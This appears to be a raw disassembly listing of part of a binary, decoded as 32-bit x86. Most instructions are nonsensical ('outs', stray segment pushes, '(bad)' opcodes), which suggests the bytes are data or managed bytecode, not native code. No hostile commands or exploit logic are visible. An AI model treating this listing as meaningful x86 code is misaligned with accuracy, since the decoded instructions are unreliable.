  4033f4:	sub    BYTE PTR ds:0x2060000,cl
  4033fa:	push   es
  4033fb:	outs   dx,DWORD PTR ds:[esi]
  4033fc:	cmp    al,BYTE PTR [eax]
  4033fe:	add    BYTE PTR [esi],al
  403400:	pop    ss
  403401:	pop    ecx
  403402:	pop    ss
  403403:	jae    0x403441
  403405:	add    BYTE PTR [eax],al
  403407:	push   es
  403408:	jp     0x403410
  40340a:	outs   dx,DWORD PTR ds:[esi]
  40340b:	add    BYTE PTR [eax],0x0
  40340e:	or     cl,BYTE PTR ds:0x27f38
  403414:	add    BYTE PTR [edi],al
  403416:	push   ss
  403417:	outs   dx,DWORD PTR ds:[esi]
  403418:	test   BYTE PTR [eax],al
  40341a:	add    BYTE PTR [edx],cl
  40341c:	sub    ebx,DWORD PTR [ecx+0x9]
  40341f:	pop    ds
  403420:	or     eax,0x1f09052e
  403425:	or     dh,BYTE PTR [ebx]
  403427:	cmp    esi,DWORD PTR [edx-0x41]
  40342a:	push   es
  40342b:	add    BYTE PTR [eax+0x18],dh
  40342e:	lea    eax,[ecx]
  403430:	add    BYTE PTR [eax],al
  403432:	add    DWORD PTR [ebx],edx
  403434:	or     edx,DWORD PTR [ecx]
  403436:	or     edx,DWORD PTR [esi]
  403438:	pop    es
  403439:	outs   dx,DWORD PTR ds:[esi]
  40343a:	test   DWORD PTR [eax],eax
  40343c:	add    BYTE PTR [edx],cl
  40343e:	mov    WORD PTR [ecx],?
  403440:	add    BYTE PTR [eax],al
  403442:	add    DWORD PTR [edx+0x7170b11],esp
  403448:	mov    ds:0xd280b11,al
  40344d:	add    BYTE PTR [eax],al
  40344f:	push   es
  403450:	add    al,BYTE PTR [esi]
  403452:	outs   dx,DWORD PTR ds:[esi]
  403453:	cmp    al,BYTE PTR [eax]
  403455:	add    BYTE PTR [esi],al
  403457:	push   es
  403458:	outs   dx,DWORD PTR ds:[esi]
  403459:	cmp    eax,DWORD PTR [eax]
  40345b:	add    BYTE PTR [esi],al
  40345d:	jae    0x40349b
  40345f:	add    BYTE PTR [eax],al
  403461:	push   es
  403462:	jp     0x40346b
  403464:	or     ecx,edx
  403466:	outs   dx,DWORD PTR ds:[esi]
  403467:	xchg   BYTE PTR [eax],al
  403469:	add    BYTE PTR [edx],cl
  40346b:	es push es
  40346d:	outs   dx,DWORD PTR ds:[esi]
  40346e:	add    BYTE PTR [eax],0x0
  403471:	or     cl,BYTE PTR ds:0x52e1509
  403477:	or     DWORD PTR [edi],ebx
  403479:	cmp    eax,0x6f07a233
  40347e:	test   DWORD PTR [eax],eax
  403480:	add    BYTE PTR [edx],cl
  403482:	sub    eax,0x6e7721d
  403487:	add    BYTE PTR [eax+0x28],dh
  40348a:	push   cs
  40348b:	add    BYTE PTR [eax],al
  40348d:	push   es
  40348e:	add    al,BYTE PTR [esi]
  403490:	outs   dx,DWORD PTR ds:[esi]
  403491:	cmp    al,BYTE PTR [eax]
  403493:	add    BYTE PTR [esi],al
  403495:	push   es
  403496:	outs   dx,DWORD PTR ds:[esi]
  403497:	cmp    eax,DWORD PTR [eax]
  403499:	add    BYTE PTR [esi],al
  40349b:	jae    0x4034d9
  40349d:	add    BYTE PTR [eax],al
  40349f:	push   es
  4034a0:	jp     0x4034a9
  4034a2:	pop    es
  4034a3:	outs   dx,DWORD PTR ds:[esi]
  4034a4:	test   DWORD PTR [eax],eax
  4034a6:	add    BYTE PTR [edx],cl
  4034a8:	pop    ss
  4034a9:	pop    ecx
  4034aa:	outs   dx,DWORD PTR ds:[esi]
  4034ab:	xchg   DWORD PTR [eax],eax
  4034ad:	add    BYTE PTR [edx],cl
  4034af:	pop    ds
  4034b0:	and    BYTE PTR [ebx],dh
  4034b2:	push   cs
  4034b3:	pop    es
  4034b4:	pop    es
  4034b5:	outs   dx,DWORD PTR ds:[esi]
  4034b6:	test   DWORD PTR [eax],eax
  4034b8:	add    BYTE PTR [edx],cl
  4034ba:	pop    ss
  4034bb:	pop    ecx
  4034bc:	outs   dx,DWORD PTR ds:[esi]
  4034bd:	test   BYTE PTR [eax],al
  4034bf:	add    BYTE PTR [edx],cl
  4034c1:	push   es
  4034c2:	outs   dx,DWORD PTR ds:[esi]
  4034c3:	add    BYTE PTR [eax],0x0
  4034c6:	or     cl,BYTE PTR ds:0x33201f09
  4034cc:	pop    es
  4034cd:	push   es
  4034ce:	outs   dx,DWORD PTR ds:[esi]
  4034cf:	add    BYTE PTR [eax],0x0
  4034d2:	or     cl,BYTE PTR ds:0x846f1608
  4034d8:	add    BYTE PTR [eax],al
  4034da:	or     bh,BYTE PTR [eax]
  4034dc:	pop    DWORD PTR [ecx]
  4034de:	add    BYTE PTR [eax],al
  4034e0:	push   ss
  4034e1:	adc    eax,DWORD PTR ds:0x405c1f09
  4034e7:	inc    esp
  4034e8:	add    DWORD PTR [eax],eax
  4034ea:	add    BYTE PTR [esi],al
  4034ec:	outs   dx,DWORD PTR ds:[esi]
  4034ed:	add    BYTE PTR [eax],0x0
  4034f0:	or     cl,BYTE PTR ds:0x110c1309
  4034f6:	or     al,0x1f
  4034f8:	pop    esp
  4034f9:	xor    BYTE PTR [ecx+edx*1],dl
  4034fc:	or     al,0x1f
  4034fe:	and    ch,BYTE PTR [esi]
  403500:	push   ecx
  403501:	adc    DWORD PTR [edi+ebx*1],ecx
  403504:	pop    esp
  403505:	cmp    esp,DWORD PTR ds:0x38000001
  40350b:	in     al,0x0
  40350d:	add    BYTE PTR [eax],al
  40350f:	adc    DWORD PTR [edi+ebx*1],ecx
  403512:	outs   dx,BYTE PTR ds:[esi]
  403513:	cs pop ds
  403515:	adc    DWORD PTR [edi+ebx*1],ecx
  403518:	jb     0x403573
  40351a:	inc    ebp
  40351b:	add    al,0x0
  40351d:	add    BYTE PTR [eax],al
  40351f:	adc    BYTE PTR [eax],al
  403521:	add    BYTE PTR [eax],al
  403523:	les    eax,FWORD PTR [eax]
  403525:	add    BYTE PTR [eax],al
  403527:	sbb    eax,DWORD PTR [eax]
  403529:	add    BYTE PTR [eax],al
  40352b:	sub    eax,DWORD PTR [eax]
  40352d:	add    BYTE PTR [eax],al
  40352f:	cmp    BYTE PTR [edi+0x1f000000],bh
  403535:	or     cl,BYTE PTR ds:0x38051317
  40353b:	lock add BYTE PTR [eax],al
  40353e:	add    BYTE PTR [edi],bl
  403540:	or     eax,0x513170d
  403545:	cmp    ch,ah
  403547:	add    BYTE PTR [eax],al
  403549:	add    BYTE PTR [edi],bl
  40354b:	or     DWORD PTR ds:0xdd38,ecx
  403551:	add    BYTE PTR [edi],bl
  403553:	and    cl,BYTE PTR ds:0xd538
  403559:	add    BYTE PTR [edx],bl
  40355b:	lea    eax,[edx+0x0]
  40355e:	add    BYTE PTR [ecx],al
  403560:	adc    eax,DWORD PTR [esi]
  403562:	sbb    dl,BYTE PTR [ebx]
  403564:	pop    es
  403565:	push   ss
  403566:	adc    ecx,DWORD PTR [eax]
  403568:	sub    ebx,DWORD PTR [esi+eax*1+0x11]
  40356c:	push   es
  40356d:	adc    DWORD PTR [eax],ecx
  40356f:	adc    DWORD PTR [edi],eax
  403571:	outs   dx,DWORD PTR ds:[esi]
  403572:	mov    BYTE PTR [eax],al
  403574:	add    BYTE PTR [edx],cl
  403576:	adc    ecx,DWORD PTR [ecx]
  403578:	adc    DWORD PTR [ecx],ecx
  40357a:	sub    eax,0x6f9723c
  40357f:	add    BYTE PTR [eax+0x18],dh
  403582:	lea    eax,[ecx]
  403584:	add    BYTE PTR [eax],al
  403586:	add    DWORD PTR [ebx],edx
  403588:	or     eax,0x9160d11
  40358d:	ror    DWORD PTR [edx+eax*2-0x5dff0000],1
  403594:	adc    DWORD PTR ds:0x546f0717,ecx
  40359a:	add    BYTE PTR [eax],al
  40359c:	or     ah,BYTE PTR [edx+0xd280d11]
  4035a2:	add    BYTE PTR [eax],al
  4035a4:	push   es
  4035a5:	add    al,BYTE PTR [esi]
  4035a7:	outs   dx,DWORD PTR ds:[esi]
  4035a8:	cmp    al,BYTE PTR [eax]
  4035aa:	add    BYTE PTR [esi],al
  4035ac:	push   es
  4035ad:	outs   dx,DWORD PTR ds:[esi]
  4035ae:	cmp    eax,DWORD PTR [eax]
  4035b0:	add    BYTE PTR [esi],al
  4035b2:	jae    0x4035f0
  4035b4:	add    BYTE PTR [eax],al
  4035b6:	push   es
  4035b7:	jp     0x4035ca
  4035b9:	or     BYTE PTR [ecx],dl
  4035bb:	or     DWORD PTR [eax+0x13],ebx
  4035be:	or     BYTE PTR [ecx],dl
  4035c0:	pop    es
  4035c1:	adc    DWORD PTR [ecx],ecx
  4035c3:	pop    ecx
  4035c4:	adc    eax,DWORD PTR [edi]
  4035c6:	adc    DWORD PTR [edi],eax
  4035c8:	push   ss
  4035c9:	xor    BYTE PTR [edi-0x768cf9ef],bl
  4035cf:	add    BYTE PTR [eax],al
  4035d1:	or     ah,BYTE PTR [eax]
  4035d3:	add    eax,DWORD PTR [edx]
  4035d5:	add    BYTE PTR [eax],al
  4035d7:	sub    BYTE PTR [edx],dh
  4035d9:	add    BYTE PTR [eax],al
  4035db:	or     ch,BYTE PTR [eax]
  4035dd:	mov    al,BYTE PTR [eax]
  4035df:	add    BYTE PTR [edx],cl
  4035e1:	or     eax,0x2e0a1f09
  4035e6:	pop    es
  4035e7:	or     DWORD PTR [edi],ebx
  4035e9:	or     eax,0x12b01fe
  4035ee:	pop    ss
  4035ef:	adc    eax,DWORD PTR ds:0xf9723c2b
  4035f5:	push   es
  4035f6:	add    BYTE PTR [eax+0x18],dh
  4035f9:	lea    eax,[ecx]
  4035fb:	add    BYTE PTR [eax],al
  4035fd:	add    DWORD PTR [ebx],edx
  4035ff:	push   cs
  403600:	adc    DWORD PTR [esi],ecx
  403602:	push   ss
  403603:	or     ecx,edx
  403605:	mov    WORD PTR [edx+0x0],es
  403608:	add    BYTE PTR [ecx],al
  40360a:	mov    ds:0x7170e11,al
  40360f:	outs   dx,DWORD PTR ds:[esi]
  403610:	push   esp
  403611:	add    BYTE PTR [eax],al
  403613:	or     ah,BYTE PTR [edx+0xd280e11]
  403619:	add    BYTE PTR [eax],al
  40361b:	push   es
  40361c:	add    al,BYTE PTR [esi]
  40361e:	outs   dx,DWORD PTR ds:[esi]
  40361f:	cmp    al,BYTE PTR [eax]
  403621:	add    BYTE PTR [esi],al
  403623:	push   es
  403624:	outs   dx,DWORD PTR ds:[esi]
  403625:	cmp    eax,DWORD PTR [eax]
  403627:	add    BYTE PTR [esi],al
  403629:	jae    0x403667
  40362b:	add    BYTE PTR [eax],al
  40362d:	push   es
  40362e:	jp     0x403641
  403630:	add    eax,0x1f092c2d
  403635:	or     eax,0x6f061933
  40363a:	add    BYTE PTR [eax],0x0
  40363d:	or     cl,BYTE PTR ds:0x332e1509
  403643:	or     DWORD PTR [edi],ebx
  403645:	or     dh,BYTE PTR [ebx]
  403647:	pop    ss
  403648:	push   es
  403649:	outs   dx,DWORD PTR ds:[esi]
  40364a:	add    BYTE PTR [eax],0x0
  40364d:	or     cl,BYTE PTR ds:0x1f09252b
  403653:	or     dh,BYTE PTR [ebx]
  403655:	or     DWORD PTR [esi],eax
  403657:	outs   dx,DWORD PTR ds:[esi]
  403658:	add    BYTE PTR [eax],0x0
  40365b:	or     cl,BYTE PTR ds:0x908172b
  403661:	shr    DWORD PTR [edi-0x7a],1
  403664:	add    BYTE PTR [eax],al
  403666:	or     ah,BYTE PTR [esi]
  403668:	push   es
  403669:	outs   dx,DWORD PTR ds:[esi]
  40366a:	add    BYTE PTR [eax],0x0
  40366d:	or     cl,BYTE PTR ds:0x6a401509
  403673:	(bad)  
  403674:	(bad)  
  403675:	inc    DWORD PTR [edi]
  403677:	outs   dx,DWORD PTR ds:[esi]
  403678:	push   esp
  403679:	add    BYTE PTR [eax],al
  40367b:	or     cl,BYTE PTR [eax]
  40367d:	outs   dx,DWORD PTR ds:[esi]
  40367e:	push   esp
  40367f:	add    BYTE PTR [eax],al
  403681:	or     al,BYTE PTR [edx]
  403683:	push   es
  403684:	outs   dx,DWORD PTR ds:[esi]
  403685:	cmp    al,BYTE PTR [eax]
  403687:	add    BYTE PTR [esi],al
  403689:	push   es
  40368a:	outs   dx,DWORD PTR ds:[esi]
  40368b:	cmp    eax,DWORD PTR [eax]
  40368d:	add    BYTE PTR [esi],al
  40368f:	sub    BYTE PTR [eax],dl
  403691:	add    BYTE PTR [eax],al
  403693:	push   es
  403694:	or     DWORD PTR ds:0xfffcd140,edx
  40369a:	(bad)  
  40369b:	fimul  WORD PTR [edx]
  40369d:	push   es
  40369e:	sub    al,0x6
  4036a0:	push   es
  4036a1:	outs   dx,DWORD PTR ds:[esi]
  4036a2:	pop    ebp
  4036a3:	add    BYTE PTR [eax],al
  4036a5:	or     bl,ah
  4036a7:	sub    al,BYTE PTR [ecx+0x1c]
  4036aa:	add    BYTE PTR [eax],al
  4036ac:	add    al,BYTE PTR [eax]
  4036ae:	add    BYTE PTR [eax],al
  4036b0:	push   cs
  4036b1:	add    BYTE PTR [eax],al
  4036b3:	add    BYTE PTR [ebx+0x3],dl
  4036b6:	add    BYTE PTR [eax],al
  4036b8:	popa   
  4036b9:	add    eax,DWORD PTR [eax]
  4036bb:	add    BYTE PTR [edx],cl
  4036bd:	add    BYTE PTR [eax],al
  4036bf:	add    BYTE PTR [eax],al
  4036c1:	add    BYTE PTR [eax],al
  4036c3:	add    BYTE PTR [ebx],dl
  4036c5:	xor    BYTE PTR [edx],al
  4036c7:	add    BYTE PTR [ebx],bh
  4036c9:	add    BYTE PTR [eax],al
  4036cb:	add    BYTE PTR [edi],cl
  4036cd:	add    BYTE PTR [eax],al
  4036cf:	adc    DWORD PTR [edx],eax
  4036d1:	sub    BYTE PTR ds:0xa060000,bl
  4036d7:	push   es
  4036d8:	or     eax,DWORD PTR [edi]
  4036da:	inc    ebp
  4036db:	add    eax,DWORD PTR [eax]
  4036dd:	add    BYTE PTR [eax],al
  4036df:	add    DWORD PTR [eax],eax
  4036e1:	add    BYTE PTR [eax],al
  4036e3:	or     BYTE PTR [eax],al
  4036e5:	add    BYTE PTR [eax],al
  4036e7:	adc    al,0x0
  4036e9:	add    BYTE PTR [eax],al
  4036eb:	sub    al,BYTE PTR [edx]
  4036ed:	sub    BYTE PTR [ecx],ch
  4036ef:	add    BYTE PTR [eax],al
  4036f1:	push   es
  4036f2:	sub    al,BYTE PTR [edx]
  4036f4:	jae    0x403681
  4036f6:	add    BYTE PTR [eax],al
  4036f8:	or     ch,BYTE PTR [eax]
  4036fa:	sub    BYTE PTR [eax],al
  4036fc:	add    BYTE PTR [esi],al
  4036fe:	sub    al,BYTE PTR [edx]
  403700:	jae    0x40368e
  403702:	add    BYTE PTR [eax],al
  403704:	or     ch,BYTE PTR [eax]
  403706:	sub    BYTE PTR [eax],al
  403708:	add    BYTE PTR [esi],al
  40370a:	sub    al,BYTE PTR [eax]
  40370c:	sbb    esi,DWORD PTR [eax]
  40370e:	add    eax,DWORD PTR [eax]
  403710:	jb     0x403712
  403712:	add    BYTE PTR [eax],al
  403714:	adc    BYTE PTR [eax],al
  403716:	add    BYTE PTR [ecx],dl
  403718:	jle    0x4036a5
  40371a:	add    BYTE PTR [eax],al
  40371c:	add    al,0x6f
  40371e:	lea    eax,[eax]
  403720:	add    BYTE PTR [edx],cl
  403722:	or     eax,0x6f09222b
  403727:	mov    es,WORD PTR [eax]
  403729:	add    BYTE PTR [edx],cl
  40372b:	je     0x40373e
  40372d:	add    BYTE PTR [eax],al
  40372f:	add    cl,BYTE PTR [edx]
  403731:	push   es
  403732:	jnp    0x4036d0
  403734:	add    BYTE PTR [eax],al
  403736:	add    al,0xb
  403738:	push   es
  403739:	jnp    0x4036d8
  40373b:	add    BYTE PTR [eax],al
  40373d:	add    al,0xc
  40373f:	add    al,BYTE PTR [edi]
  403741:	or     BYTE PTR [edi-0x71],ch
  403744:	add    BYTE PTR [eax],al
  403746:	or     cl,BYTE PTR [ecx]
  403748:	outs   dx,DWORD PTR ds:[esi]
  403749:	add    BYTE PTR [eax],0x0
  40374c:	or     ch,BYTE PTR ds:0x914ded6
  403752:	jne    0x403794
  403754:	add    BYTE PTR [eax],al
  403756:	add    DWORD PTR [ebx],edx
  403758:	add    al,0x11
  40375a:	add    al,0x2c
  40375c:	pop    es
  40375d:	adc    DWORD PTR [edi+ebp*2],eax
  403760:	pop    ebp
  403761:	add    BYTE PTR [eax],al
  403763:	or     bl,ah
  403765:	jb     0x403774
  403767:	pop    es
  403768:	add    BYTE PTR [eax+0x28],dh
  40376b:	push   cs
  40376c:	add    BYTE PTR [eax],al
  40376e:	push   es
  40376f:	sub    BYTE PTR [eax+0x20a0000],dl
  403775:	outs   dx,DWORD PTR ds:[esi]
  403776:	xchg   ecx,eax
  403777:	add    BYTE PTR [eax],al
  403779:	or     dh,BYTE PTR [edx+0x4b]
  40377c:	push   es
  40377d:	add    BYTE PTR [eax+0x28],dh
  403780:	push   cs
  403781:	add    BYTE PTR [eax],al
  403783:	push   es
  403784:	sub    BYTE PTR [eax+eax*1+0x0],dh
  403788:	or     ch,BYTE PTR [edx]
  40378a:	add    BYTE PTR [eax],al
  40378c:	add    DWORD PTR [eax],edx
  40378e:	add    BYTE PTR [eax],al
  403790:	add    al,BYTE PTR [eax]
  403792:	or     eax,DWORD PTR [eax]
  403794:	cmp    DWORD PTR cs:[eax],eax
  403797:	adc    al,0x0
  403799:	add    BYTE PTR [eax],al
  40379b:	add    BYTE PTR [ebx],bl
  40379d:	xor    BYTE PTR [eax+eax*1],al
  4037a0:	std    
  4037a1:	add    BYTE PTR [eax],al
  4037a3:	add    BYTE PTR [ecx],dl
  4037a5:	add    BYTE PTR [eax],al
  4037a7:	adc    DWORD PTR [edx],eax
  4037a9:	push   ss
  4037aa:	sub    BYTE PTR [edx+0x730a0000],dl
  4037b0:	jb     0x4037b2
  4037b2:	add    BYTE PTR [edx],cl
  4037b4:	or     bh,BYTE PTR [esi-0x75]
  4037b7:	add    BYTE PTR [eax],al
  4037b9:	add    al,0x6f
  4037bb:	lea    eax,[eax]
  4037bd:	add    BYTE PTR [edx],cl
  4037bf:	adc    eax,DWORD PTR ds:0xaf38
  4037c5:	add    BYTE PTR [ecx],dl
  4037c7:	add    eax,0x8e6f
  4037cc:	or     dh,BYTE PTR [ecx+edx*1+0x0]
  4037d0:	add    BYTE PTR [edx],al
  4037d2:	or     eax,DWORD PTR [edi]
  4037d4:	jnp    0x403772
  4037d6:	add    BYTE PTR [eax],al
  4037d8:	add    al,0xc
  4037da:	pop    es
  4037db:	jnp    0x40377a
  4037dd:	add    BYTE PTR [eax],al
  4037df:	add    al,0xd
  4037e1:	or     DWORD PTR [ebp+0x2d],esi
  4037e4:	add    BYTE PTR [eax],al
  4037e6:	add    DWORD PTR [ebx],edx
  4037e8:	add    al,0x11
  4037ea:	add    al,0x2d
  4037ec:	cs jb  0x403816
  4037ef:	pop    es
  4037f0:	add    BYTE PTR [eax+0x18],dh
  4037f3:	lea    eax,[ecx]
  4037f5:	add    BYTE PTR [eax],al
  4037f7:	add    DWORD PTR [ebx],edx
  4037f9:	push   es
  4037fa:	adc    DWORD PTR [esi],eax
  4037fc:	push   ss
  4037fd:	or     BYTE PTR [edx+0x9170611],ah
  403803:	outs   dx,DWORD PTR ds:[esi]
  403804:	pop    ds
  403805:	add    BYTE PTR [eax],al
  403807:	or     ch,BYTE PTR [edi-0x6d]
  40380a:	add    BYTE PTR [eax],al
  40380c:	or     ah,BYTE PTR [edx+0xd280611]
  403812:	add    BYTE PTR [eax],al
  403814:	push   es
  403815:	add    ch,BYTE PTR [eax]
  403817:	adc    al,0x0
  403819:	add    BYTE PTR [esi],al
  40381b:	adc    DWORD PTR [edx+esi*2],eax
  40381e:	cmp    eax,0x72700007
  403823:	inc    ecx
  403824:	pop    es
  403825:	add    BYTE PTR [eax+0x6f],dh
  403828:	xchg   esp,eax
  403829:	add    BYTE PTR [eax],al
  40382b:	or     dl,BYTE PTR [ebx]
  40382d:	add    al,0x11
  40382f:	add    al,0x72
  403831:	inc    edi
  403832:	pop    es
  403833:	add    BYTE PTR [eax+0x72],dh
  403836:	dec    ebx
  403837:	pop    es
  403838:	add    BYTE PTR [eax+0x6f],dh
  40383b:	xchg   esp,eax
  40383c:	add    BYTE PTR [eax],al
  40383e:	or     dl,BYTE PTR [ebx]
  403840:	add    al,0x11
  403842:	add    al,0x72
  403844:	push   ecx
  403845:	pop    es
  403846:	add    BYTE PTR [eax+0x72],dh
  403849:	push   ebp
  40384a:	pop    es
  40384b:	add    BYTE PTR [eax+0x6f],dh
  40384e:	xchg   esp,eax
  40384f:	add    BYTE PTR [eax],al
  403851:	or     dl,BYTE PTR [ebx]
  403853:	add    al,0x11
  403855:	add    al,0x72
  403857:	pop    ebx
  403858:	pop    es
  403859:	add    BYTE PTR [eax+0x72],dh
  40385c:	pop    edi
  40385d:	pop    es
  40385e:	add    BYTE PTR [eax+0x6f],dh
  403861:	xchg   esp,eax
  403862:	add    BYTE PTR [eax],al
  403864:	or     dl,BYTE PTR [ebx]
  403866:	add    al,0x6
  403868:	jb     0x4038cf
  40386a:	pop    es
  40386b:	add    BYTE PTR [eax+0x8],dh
  40386e:	adc    DWORD PTR [edi+ebp*2],eax
  403871:	sub    eax,0x110a0000
  403876:	add    eax,0x806f
  40387b:	or     bh,BYTE PTR [edx]
  40387d:	inc    ebp
  40387e:	(bad)  
  40387f:	(bad)  
  403880:	(bad)  
  403881:	ficom  WORD PTR ds:0x40750511
  403887:	add    BYTE PTR [eax],al
  403889:	add    DWORD PTR [ebx],edx
  40388b:	pop    es
  40388c:	adc    DWORD PTR [edi],eax
  40388e:	sub    al,0x7
  403890:	adc    DWORD PTR [edi],eax
  403892:	outs   dx,DWORD PTR ds:[esi]
  403893:	pop    ebp
  403894:	add    BYTE PTR [eax],al
  403896:	or     bl,ah
  403898:	fimul  WORD PTR [edx]
  40389a:	push   es
  40389b:	sub    al,0x6
  40389d:	push   es
  40389e:	outs   dx,DWORD PTR ds:[esi]
  40389f:	pop    ebp
  4038a0:	add    BYTE PTR [eax],al
  4038a2:	or     bl,ah
  4038a4:	sub    al,BYTE PTR [eax]
  4038a6:	add    BYTE PTR [eax],al
  4038a8:	add    DWORD PTR [eax+eax*1],ebx
  4038ab:	add    BYTE PTR [edx],al
  4038ad:	add    BYTE PTR [ecx],bl
  4038af:	add    dl,al
  4038b1:	fild   DWORD PTR [eax]
  4038b3:	adc    eax,0x0
  4038b8:	add    al,BYTE PTR [eax]
  4038ba:	or     eax,0xf2e500
  4038bf:	or     al,BYTE PTR [eax]
  4038c1:	add    BYTE PTR [eax],al
  4038c3:	add    BYTE PTR [ebx],dl
  4038c5:	xor    BYTE PTR [eax+eax*1],al
  4038c8:	lea    eax,[eax]
  4038ca:	add    BYTE PTR [eax],al
  4038cc:	adc    al,BYTE PTR [eax]
  4038ce:	add    BYTE PTR [ecx],dl
  4038d0:	jb     0x403947
  4038d2:	pop    es
  4038d3:	add    BYTE PTR [eax+0x18],dh
  4038d6:	lea    eax,[ecx]
  4038d8:	add    BYTE PTR [eax],al
  4038da:	add    DWORD PTR [ebx],edx
  4038dc:	add    al,0x11
  4038de:	add    al,0x16
  4038e0:	sub    BYTE PTR [ebp-0x5df60000],dl
  4038e6:	adc    DWORD PTR [edi+edx*1],eax
  4038e9:	sub    BYTE PTR [edx],al
  4038eb:	add    BYTE PTR [eax],al
  4038ed:	push   es
  4038ee:	mov    ds:0xd280411,al
  4038f3:	add    BYTE PTR [eax],al
  4038f5:	push   es
  4038f6:	sub    BYTE PTR [eax+eax*1+0x0],dh
  4038fa:	or     dh,BYTE PTR [edx-0x7f]
  4038fd:	pop    es
  4038fe:	add    BYTE PTR [eax+0x28],dh
  403901:	push   cs
  403902:	add    BYTE PTR [eax],al
  403904:	push   es
  403905:	sub    BYTE PTR [eax+eax*1+0x0],dh
  403909:	or     ch,BYTE PTR [eax]
  40390b:	xchg   esi,eax
  40390c:	add    BYTE PTR [eax],al
  40390e:	or     cl,BYTE PTR [edx]
  403910:	push   ss
  403911:	or     ebp,DWORD PTR [ebx]
  403913:	cmp    eax,0x6f9a0706
  403918:	xchg   edi,eax
  403919:	add    BYTE PTR [eax],al
  40391b:	or     cl,BYTE PTR [edi+eax*1]
  40391e:	sub    al,0xa
  403920:	jb     0x4038c1
  403922:	pop    es
  403923:	add    BYTE PTR [eax+0x28],dh
  403926:	nop
  403927:	add    BYTE PTR [eax],al
  403929:	or     dl,BYTE PTR [esi]
  40392b:	or     eax,0x2c09192b
  403930:	or     dh,BYTE PTR [edx-0x61]
  403933:	pop    es
  403934:	add    BYTE PTR [eax+0x28],dh
  403937:	nop
  403938:	add    BYTE PTR [eax],al
  40393a:	or     cl,BYTE PTR [eax]
  40393c:	or     DWORD PTR [edx+0x9028],ebx
  403942:	or     cl,BYTE PTR [ecx]
  403944:	pop    ss
  403945:	pop    eax
  403946:	or     eax,0x698e0809
  40394b:	xor    ah,cl
  40394d:	pop    es
  40394e:	pop    ss
  40394f:	pop    eax
  403950:	or     eax,DWORD PTR [edi]
  403952:	push   es
  403953:	mov    gs,WORD PTR [ecx+0x32]
  403956:	mov    ebp,0x6c28
  40395b:	or     ch,BYTE PTR [edx]
  40395d:	call   0x400:0x898016
  403964:	push   ss
  403965:	or     BYTE PTR [edx+0x73040000],0x98
  40396c:	add    BYTE PTR [eax],al
  40396e:	or     al,BYTE PTR [eax+0x400008b]
  403974:	sub    BYTE PTR [ecx+0x730a0000],bl
  40397a:	call   0x8c:0x800a0000
  403981:	add    BYTE PTR [edx+ebp*1],al
  403984:	push   ds
  403985:	add    ch,BYTE PTR [eax]
  403987:	push   ds
  403988:	add    BYTE PTR [eax],al
  40398a:	or     ch,BYTE PTR [edx]
  40398c:	mov    dl,0x2
  40398e:	sub    BYTE PTR [esi],bl
  403990:	add    BYTE PTR [eax],al
  403992:	or     al,BYTE PTR [edx]
  403994:	add    edi,DWORD PTR [ebp-0x72]
  403997:	add    BYTE PTR [eax],al
  403999:	add    al,0x2
  40399b:	add    al,0x7d
  40399d:	pop    DWORD PTR [eax]
  40399f:	add    BYTE PTR [edx+eax*1],al
  4039a2:	add    eax,0x907d
  4039a7:	add    al,0x2
  4039a9:	push   cs
  4039aa:	add    al,0x7d
  4039ac:	xchg   ecx,eax
  4039ad:	add    BYTE PTR [eax],al
  4039af:	add    al,0x2
  4039b1:	push   cs
  4039b2:	add    eax,0x927d
  4039b7:	add    al,0x2a
  4039b9:	push   ds
  4039ba:	add    bh,BYTE PTR [ebx-0x72]
  4039bd:	add    BYTE PTR [eax],al
  4039bf:	add    al,0x2a
  4039c1:	push   ds
  4039c2:	add    bh,BYTE PTR [ebx-0x71]
  4039c5:	add    BYTE PTR [eax],al
  4039c7:	add    al,0x2a
  4039c9:	push   ds
  4039ca:	add    bh,BYTE PTR [ebx-0x70]
  4039cd:	add    BYTE PTR [eax],al
  4039cf:	add    al,0x2a
  4039d1:	push   ds
  4039d2:	add    bh,BYTE PTR [ebx-0x6f]
  4039d5:	add    BYTE PTR [eax],al
  4039d7:	add    al,0x2a
  4039d9:	push   ds
  4039da:	add    bh,BYTE PTR [ebx-0x6e]
  4039dd:	add    BYTE PTR [eax],al
  4039df:	add    al,0x2a
  4039e1:	and    al,BYTE PTR [edx]
  4039e3:	add    edi,DWORD PTR [ebp-0x6e]
  4039e6:	add    BYTE PTR [eax],al
  4039e8:	add    al,0x2a
  4039ea:	bound  eax,QWORD PTR [edx]
  4039ec:	add    eax,DWORD PTR [eax*1+0x9b28]
  4039f3:	or     al,BYTE PTR [edx]
  4039f5:	pop    ss
  4039f6:	jge    0x40398b
  4039f8:	add    BYTE PTR [eax],al
  4039fa:	add    al,0x2
  4039fc:	push   ss
  4039fd:	jge    0x403993
  4039ff:	add    BYTE PTR [eax],al
  403a01:	add    al,0x2a
  403a03:	pop    edx
  403a04:	add    al,BYTE PTR [ebx]
  403a06:	sub    BYTE PTR [eax+eax*1+0x17020a00],bl
  403a0d:	jge    0x4039a2
  403a0f:	add    BYTE PTR [eax],al
  403a11:	add    al,0x2
  403a13:	push   ss
  403a14:	jge    0x4039aa
  403a16:	add    BYTE PTR [eax],al
  403a18:	add    al,0x2a
  403a1a:	add    BYTE PTR [eax],al
  403a1c:	adc    esi,DWORD PTR [eax]
  403a1e:	add    eax,DWORD PTR [eax]
  403a20:	xor    eax,0x7000000
  403a25:	add    BYTE PTR [eax],al
  403a27:	adc    DWORD PTR [edx],eax
  403a29:	sub    BYTE PTR [ebp+0xa0a0000],bl
  403a2f:	push   es
  403a30:	adc    eax,0x2502282e
  403a35:	jnp    0x4039cb
  403a37:	add    BYTE PTR [eax],al
  403a39:	add    al,0x17
  403a3b:	pop    eax
  403a3c:	jge    0x4039d2
  403a3e:	add    BYTE PTR [eax],al
  403a40:	add    al,0x6
  403a42:	pop    ds
  403a43:	or     dh,BYTE PTR [ebx]
  403a45:	adc    eax,0x937b2502
  403a4a:	add    BYTE PTR [eax],al
  403a4c:	add    al,0x17
  403a4e:	pop    eax
  403a4f:	jge    0x4039e4
  403a51:	add    BYTE PTR [eax],al
  403a53:	add    al,0x2
  403a55:	push   ss
  403a56:	jge    0x4039ec
  403a58:	add    BYTE PTR [eax],al
  403a5a:	add    al,0x6
  403a5c:	sub    al,BYTE PTR [eax]
  403a5e:	add    BYTE PTR [eax],al
  403a60:	adc    esi,DWORD PTR [eax]
  403a62:	add    al,0x0
  403a64:	inc    esi
  403a65:	add    BYTE PTR [eax],al
  403a67:	add    BYTE PTR [ebx],dl
  403a69:	add    BYTE PTR [eax],al
  403a6b:	adc    DWORD PTR [edx],eax
  403a6d:	add    eax,DWORD PTR [eax*1+0x9e28]
